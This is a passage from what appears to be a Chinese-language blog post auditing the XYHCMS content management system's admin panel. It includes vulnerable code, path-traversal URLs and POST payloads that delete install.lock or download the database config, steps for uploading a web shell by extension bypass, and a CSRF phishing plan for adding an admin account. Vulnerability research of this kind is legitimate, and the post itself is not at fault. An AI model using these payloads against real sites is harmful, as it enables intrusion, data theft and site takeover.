+<li><p>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</p>
+</li>
+<li><p>添加类型 <code>php3</code>或 <code>php4</code>或 <code>php5</code> 或 <code>phtml</code></p>
+</li>
+<li><p>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</p>
+</li>
+<li><p>之后会在图片部分显示上传路径</p>
+<p><img src="/images/xyhcms-2.png" alt="image2"></p>
+</li>
+<li><p>访问连接即可，只有网站配置了.htaccess自动解析php3-5与phtml的才能解析。</p>
+</li>
+</ol>
+</li>
+<li><h4 id="实际利用-3"><a href="#实际利用-3" class="headerlink" title="实际利用"></a>实际利用</h4><p>上传成功，但是不解析shell</p>
+<p>V3.6也存在此漏洞</p>
+<p>默认不解析php3-5,除非遇到个别的站</p>
+</li>
+</ul>
+<h3 id="文件上传漏洞2（后台-amp-windows）"><a href="#文件上传漏洞2（后台-amp-windows）" class="headerlink" title="文件上传漏洞2（后台&amp;windows）"></a>文件上传漏洞2（后台&amp;windows）</h3><ul>
+<li><h4 id="漏洞文件位置-3"><a href="#漏洞文件位置-3" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p>
+</li>
+<li><h4 id="漏洞原因-4"><a href="#漏洞原因-4" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>windows系统特性，windows会将 <code>::$DATA</code>忽略</p>
+</li>
+<li><h4 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">				$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">				$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">				$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">				foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">					if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">						$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">					&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">				&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">			&#125;</span></pre></td></tr></table></figure>
+</li>
+<li><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li>进入后台</li>
+<li>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</li>
+<li>添加类型 <code>shell.php::$DATA</code></li>
+<li>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</li>
+<li>之后会在图片部分显示上传路径，在windows下面，会自动忽略后面的。</li>
+<li>用蚁剑访问 <code>http://domain/路径去掉::$DATA</code></li>
+</ol>
+</li>
+</ul>
+<h3 id="任意文件删除漏洞（后台）"><a href="#任意文件删除漏洞（后台）" class="headerlink" title="任意文件删除漏洞（后台）"></a>任意文件删除漏洞（后台）</h3><ul>
+<li><h4 id="漏洞文件位置-4"><a href="#漏洞文件位置-4" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code></p>
+</li>
+<li><h4 id="漏洞原因-5"><a href="#漏洞原因-5" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>路径过滤不严</p>
+</li>
+<li><h4 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;删除sql文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">public function delSqlFiles() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">	$id &#x3D; I(&#39;id&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	$batchFlag &#x3D; I(&#39;get.batchFlag&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	&#x2F;&#x2F;批量删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">	if ($batchFlag) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">		$files &#x3D; I(&#39;key&#39;, array());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">	&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">		$files[] &#x3D; I(&#39;sqlfilename&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">	if (empty($files)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">		$this-&gt;error(&#39;请选择要删除的sql文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">	foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">		$_ext &#x3D; pathinfo($file, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">		&#x2F;&#x2F;拼接后直接删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">	foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">		unlink($this-&gt;getDbPath() . &#39;&#x2F;&#39; . $file);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">	$this-&gt;success(&quot;已删除：&quot; . implode(&quot;,&quot;, $files), U(&#39;Database&#x2F;restore&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p>删除的文件位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function getDbPath() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">		return &#39;.&#x2F;Data&#x2F;resource&#x2F;backupdata&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li><p>登录后台</p>
+</li>
+<li><p>删除安装锁文件</p>
+<ol>
+<li><p>get方式</p>
+<p><code>http://domain/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock</code></p>
+</li>
+<li><p>post方式</p>
+<p><code>http://domain/xyhai.php?s=/Database/delSqlFiles/batchFlag/1</code></p>
+<p>POST数据：<code>key[]=../../../install/install.lock</code></p>
+</li>
+</ol>
+</li>
+<li><p>之后访问 <code>http://domain/install</code>重装cms</p>
+</li>
+</ol>
+</li>
+<li><h4 id="实际利用-4"><a href="#实际利用-4" class="headerlink" title="实际利用"></a>实际利用</h4><p>在官网发布的v3.5版本已经做了过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($file, &#39;..&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($file, &#39;..\\&#39;) || $_ext !&#x3D; &#39;sql&#39;) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">				$this-&gt;error(&#39;删除失败：sql文件非法！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">			&#125;</span></pre></td></tr></table></figure>
+
+<p>所以之后下载的没这个漏洞了，之前下载才有这个漏洞。</p>
+</li>
+</ul>
+<h3 id="任意文件下载（后台）"><a href="#任意文件下载（后台）" class="headerlink" title="任意文件下载（后台）"></a>任意文件下载（后台）</h3><ul>
+<li><h4 id="漏洞文件位置-5"><a href="#漏洞文件位置-5" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code>的<code>downfile()</code>方法</p>
+</li>
+<li><h4 id="漏洞原因-6"><a href="#漏洞原因-6" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p> 没有对下载的文件做任何限制 </p>
+</li>
+<li><h4 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function downFile() &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    if (empty($_GET[&#39;file&#39;]) || empty($_GET[&#39;type&#39;]) || !in_array($_GET[&#39;type&#39;], array(&quot;zip&quot;, &quot;sql&quot;))) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;下载地址不存在&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $path     &#x3D; array(&quot;zip&quot; &#x3D;&gt; $this-&gt;getDbPath() . &quot;Zip&#x2F;&quot;, &quot;sql&quot; &#x3D;&gt; $this-&gt;getDbPath() . &#39;&#x2F;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $filePath &#x3D; $path[$_GET[&#39;type&#39;]] . $_GET[&#39;file&#39;];  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    if (!file_exists($filePath)) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;该文件不存在，可能是被删除&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     $filename &#x3D; basename($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-type: application&#x2F;octet-stream&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">     header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39; . $filename . &#39;&quot;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-Length: &quot; . filesize($filePath));  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     readfile($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"> &#125;</span></pre></td></tr></table></figure>
+</li>
+<li><h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li>登录后台</li>
+<li>访问<code>http://domain/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip</code></li>
+<li>下载到数据库配置文件</li>
+</ol>
+</li>
+<li><h4 id="实际利用-5"><a href="#实际利用-5" class="headerlink" title="实际利用"></a>实际利用</h4><p> 在v3.5版本中，<code>/App/Manage/Controller/DatabaseController.class.php</code>文件的最后更改时间为 <code>2019/9/16</code>，洞被补上了，downfile方法直接被删除了。</p>
+</li>
+</ul>
+<h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><ul>
+<li><h4 id="漏洞文件位置-6"><a href="#漏洞文件位置-6" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>App/Manager/Controller/AuthController.class.php</code></p>
+</li>
+<li><h4 id="漏洞原因-7"><a href="#漏洞原因-7" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>验证不严，在别人报送漏洞后，虽然加了一个验证，但是可以绕过。</p>
+</li>
+<li><h4 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>`public function addUser() {</p>
+<pre><code>if (IS_POST) {
+    //用户组
+    $group_id   = I(&apos;group_id&apos;, array());
+    $department = I(&apos;department&apos;, array());
+    $_furl      = $_SERVER[&apos;HTTP_REFERER&apos;];
+    $_turl      = &apos;://&apos; . $_SERVER[&apos;HTTP_HOST&apos;] . $_SERVER[&apos;REQUEST_URI&apos;];     //HTTP_HOST有端口会带端口
+          //在这里验证了refere头，但是可以referre可由我们控制
+
+          if (stripos($_furl, $_turl) === false) {
+              $this-&gt;error(&apos;非法请求!&apos;);
+          }
+          if (empty($department)) {
+              $this-&gt;error(&apos;请选择部门&apos;);
+          }
+          if (empty($group_id)) {
+              $this-&gt;error(&apos;请选择职位&apos;);
+          }
+
+          //M验证
+          $validate = array(
+              array(&apos;username&apos;, &apos;require&apos;, &apos;用户名不能为空！&apos;),
+              array(&apos;password&apos;, &apos;require&apos;, &apos;密码不能为空！&apos;),
+              array(&apos;password&apos;, &apos;5,20&apos;, &apos;密码必须在5到20位之间&apos;, 0, &apos;length&apos;),
+              array(&apos;username&apos;, &apos;&apos;, &apos;用户名已经存在！&apos;, 0, &apos;unique&apos;, 1),
+          );
+          $data = M(&apos;Admin&apos;);
+          if (!$data-&gt;validate($validate)-&gt;create()) {
+              $this-&gt;error($data-&gt;getError());
+          }
+          $password         = get_password($data-&gt;password);
+          $data-&gt;password   = $password[&apos;password&apos;];
+          $data-&gt;encrypt    = $password[&apos;encrypt&apos;];
+          $data-&gt;status     = I(&apos;status&apos;, 0, &apos;intval&apos;);
+          $data-&gt;department = implode(&apos;,&apos;, $department);
+          $data-&gt;login_time = date(&apos;Y-m-d H:i:s&apos;);
+          $data-&gt;login_ip   = &apos;&apos;;
+
+          if ($id = $data-&gt;add()) {
+              $group_data = array();
+              foreach ($group_id as $key =&gt; $val) {
+                  $group_data[] = array(&apos;uid&apos; =&gt; $id, &apos;group_id&apos; =&gt; $val);
+              }
+
+              $result = M(&apos;AuthGroupAccess&apos;)-&gt;addAll($group_data);
+              if ($result) {
+                  $this-&gt;success(&apos;添加成功&apos;, U(&apos;indexOfUser&apos;));
+              } else {
+                  $this-&gt;error(&apos;权限设置失败|用户添加成功&apos;);
+              }
+
+          } else {
+
+              $this-&gt;error(&apos;添加失败&apos;);
+          }
+
+          exit();
+      }</code></pre></li>
+</ul>
+<ul>
+<li><h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li>在自己服务器构造html代码，要绕过referer，以前写过类似的文章</li>
+<li>生成短链接</li>
+<li>到网站留言，等鱼儿上钩。</li>
+<li>等添加后登录即可</li>
+</ol>
+</li>
+<li><h4 id="实际利用-6"><a href="#实际利用-6" class="headerlink" title="实际利用"></a>实际利用</h4><p>v2 ，v3.6也存在</p>
+<p>v2版本url  <code>http://domain/index.php?g=Manage&amp;m=Rbac&amp;a=addUser</code></p>
+</li>
+</ul>
+<h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><ol>
+<li><p>先尝试弱口令</p>
+</li>
+<li><p>再尝试csrf拿到管理员权限</p>
+</li>
+<li><p>拿到后台随便搞</p>
+</li>
+<li><p>心中默念安全法</p>
+</li>
+</ol>
+<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>经过几个网站测试，发现后台xyhai.php文件可能会被改，可以尝试admin.php</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/cms/" rel="tag"># cms</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/12/23/thinkphp-Notes/" rel="prev" title="thinkphp Notes">
+      <i class="fa fa-chevron-left"></i> thinkphp Notes
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#涉及版本"><span class="nav-number">1.</span> <span class="nav-text">涉及版本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件读取（后台）"><span class="nav-number">1.1.</span> <span class="nav-text">任意文件读取（后台）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码"><span class="nav-number">1.1.3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实际利用"><span class="nav-number">1.1.5.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件写入导致代码执行漏洞（后台）"><span class="nav-number">1.2.</span> <span class="nav-text">文件写入导致代码执行漏洞（后台）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.2.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实际利用-1"><span class="nav-number">1.2.5.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件写入导致代码执行漏洞2（后台）"><span class="nav-number">1.3.</span> <span class="nav-text">文件写入导致代码执行漏洞2（后台）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实际利用-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞（后台-amp-配置了-htaccess）"><span class="nav-number">1.4.</span> <span class="nav-text">文件上传漏洞（后台&amp;配置了.htaccess）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码-2"><span class="nav-number">1.4.3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-3"><span class="nav-number">1.4.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实际利用-3"><span class="nav-number">1.4.5.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞2（后台-amp-windows）"><span class="nav-number">1.5.</span> <span class="nav-text">文件上传漏洞2（后台&amp;windows）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码-3"><span class="nav-number">1.5.3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-4"><span class="nav-number">1.5.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件删除漏洞（后台）"><span class="nav-number">1.6.</span> <span class="nav-text">任意文件删除漏洞（后台）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置-4"><span class="nav-number">1.6.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因-5"><span class="nav-number">1.6.2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码-4"><span class="nav-number">1.6.3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-5"><span class="nav-number">1.6.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实际利用-4"><span class="nav-number">1.6.5.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件下载（后台）"><span class="nav-number">1.7.</span> <span class="nav-text">任意文件下载（后台）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置-5"><span class="nav-number">1.7.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因-6"><span class="nav-number">1.7.2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码-5"><span class="nav-number">1.7.3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-6"><span class="nav-number">1.7.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实际利用-5"><span class="nav-number">1.7.5.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF漏洞"><span class="nav-number">1.8.</span> <span class="nav-text">CSRF漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置-6"><span class="nav-number">1.8.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原因-7"><span class="nav-number">1.8.2.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞代码-6"><span class="nav-number">1.8.3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-7"><span class="nav-number">1.8.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实际利用-6"><span class="nav-number">1.8.5.</span> <span class="nav-text">实际利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#综合利用"><span class="nav-number">1.9.</span> <span class="nav-text">综合利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#坑"><span class="nav-number">1.10.</span> <span class="nav-text">坑</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="h3art3ars"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">h3art3ars</p>
+  <div class="site-description" itemprop="description">笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/h3art3ars" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;h3art3ars" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:570498521aeth@gmail.com" title="E-Mail → mailto:570498521aeth@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
